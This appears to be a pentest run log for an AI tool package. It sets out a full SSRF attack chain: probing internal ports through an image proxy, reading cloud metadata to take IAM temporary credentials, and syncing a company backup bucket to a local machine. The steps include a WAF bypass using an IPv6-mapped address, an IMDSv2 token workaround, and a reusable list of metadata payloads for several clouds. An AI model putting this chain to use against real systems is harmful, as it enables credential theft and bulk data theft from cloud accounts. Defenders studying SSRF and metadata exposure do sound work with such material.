# [2026-02] SSRF → cloud metadata → AK/SK → full OSS data

## Scenario category
Web penetration testing / cloud security

## Goal summary
Use a Web application SSRF vulnerability to access the cloud metadata service, obtain temporary credentials, and export all data from an OSS bucket.

## Full execution path

1. Find SSRF in the image proxy endpoint.
   ```
   GET /api/proxy?url=http://127.0.0.1:8080 → 200 OK (internal port probe succeeded)
   ```
2. Try to access cloud metadata
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/
   → metadata directory listing returned
   ```
3. Get the IAM role name
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   → ECS-Role-WebApp
   ```
4. Get temporary credentials
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ECS-Role-WebApp
   → AccessKeyId, SecretAccessKey, Token
   ```
5. Enumerate OSS buckets with the credentials
   ```bash
   export AWS_ACCESS_KEY_ID=AKIA...
   export AWS_SECRET_ACCESS_KEY=...
   export AWS_SESSION_TOKEN=...
   aws s3 ls  # or aliyun oss ls
   ```
6. Find a sensitive bucket and export its data
   ```bash
   aws s3 sync s3://company-backup ./backup/
   ```

## Pitfall log

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| The WAF blocked `169.254` in the SSRF request | IP blacklist | Bypass it with the IPv6 address `[::ffff:169.254.169.254]` | 15min |
| Temporary credentials expired after one hour | STS tokens have a short lifetime | Write a script to refresh the token automatically | 10min |
| Metadata v2 requires a token | IMDSv2 protection | Send PUT to obtain a token, then include the token in the request | 20min |

## Toolchain findings
- Alibaba Cloud and AWS use different metadata paths. Try each one.
- IMDSv2 needs two requests (PUT to obtain the token → GET with the token).
- Some cloud providers enable IMDSv2 by default, which makes SSRF harder.

## Key code / commands

```bash
# IMDSv2 bypass (the SSRF endpoint must support custom methods and headers)
# Step 1: obtain a token
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: send a request with the token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <token>
```

## Reusable patterns / script fragments

```bash
# Quick SSRF cloud-metadata detection payload list
PAYLOADS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/metadata/v1/"
  "http://100.100.100.200/latest/meta-data/"
  "http://metadata.google.internal/computeMetadata/v1/"
)
```

## Improvement suggestions for this package
- routing.md already has an SSRF/cloud-security route.
- Add a comparison table of cloud-provider metadata paths to `pentest-tools/references`.

## Evolution actions
- [ ] Add a comparison table of cloud metadata paths to references

## Environment information
- Target: Alibaba Cloud ECS + OSS
- Web framework: Spring Boot 2.7
- SSRF type: Full SSRF
